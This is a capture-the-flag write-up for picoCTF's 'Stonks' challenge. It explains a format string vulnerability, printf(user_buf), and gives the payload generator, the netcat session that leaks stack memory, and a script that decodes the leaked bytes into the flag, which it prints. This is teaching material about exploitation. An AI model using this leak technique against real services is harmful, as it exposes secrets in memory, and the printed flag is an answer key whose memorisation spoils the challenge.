# STONKS

## OVERVIEW & IDEA

- The challenge gives us just source file. Checking the source, I find this function have format string vulnerability.

```c
int buy_stonks(Portfolio *p) {
	char api_buf[FLAG_BUFFER];


    - read flag and put it in api_buf

    - do some stuffs

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	view_portfolio(p);

	return 0;
}
```

- Above is simplified of `buy_stonks`. But, we can leak the `api_buf[FLAG_BUFFER]` with `printf(user_buf);` with `user_buf` is input string of user.

## DETAILS & EXPLOIT

- I don't know the program is 32-bit or 64-bit, but with tried some test, it is 32-bit. So, I create a simple script for leaking data on the stack. 

```
>>> for i in range(1, 35):
...     print('%' + str(i) + '$08x', end = '', sep = '')
...
%1$08x%2$08x%3$08x%4$08x%5$08x%6$08x%7$08x%8$08x%9$08x%10$08x%11$08x%12$08x%13$08x%14$08x%15$08x%16$08x%17$08x%18$08x%19$08x%20$08x%21$08x%22$08x%23$08x%24$08x%25$08x%26$>>>
```

- Input it to the server. I got the data.

```
λ ~/ nc mercury.picoctf.net 33411
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%1$08x%2$08x%3$08x%4$08x%5$08x%6$08x%7$08x%8$08x%9$08x%10$08x%11$08x%12$08x%13$08x%14$08x%15$08x%16$08x%17$08x%18$08x%19$08x%20$08x%21$08x%22$08x%23$08x%24$08x%25$08x%26$08x%27$08x%28$08x%29$08x%30$08x%31$08x%32$08x%33$08x%34$08x
Buying stonks with token:
095624b00804b000080489c3f7f04d80ffffffff0000000109560160f7f12110f7f04dc700000000095611800000000109562490095624b06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431fffc007df7f3faf8f7f124407ddf64000000000100000000f7da1ce9f7f130c0f7f045c0f7f04000fffc4f68
Portfolio as of Wed Jan 25 17:08:50 UTC 2023
.
.
.
```

- I use online hex to text to decode this data.

![img](/picoCTF/stonks/assets/leak.png)

- It's in little endian, so, I use this script to convert it to correct flag.

```
ascii 6f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431fffc007d
char  ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿü}
```

```
>>> s = "6f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431fffc007d"
>>> for i in range(0, len(s), 8):
...     print( chr(int(s[i+6:i+8], 16)), chr(int(s[i+4:i+6], 16)), chr(int(s[i+2:i+4], 16)), chr(int(s[i:i+2], 16)), sep = '', end = '')
...
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}üÿ>>>
```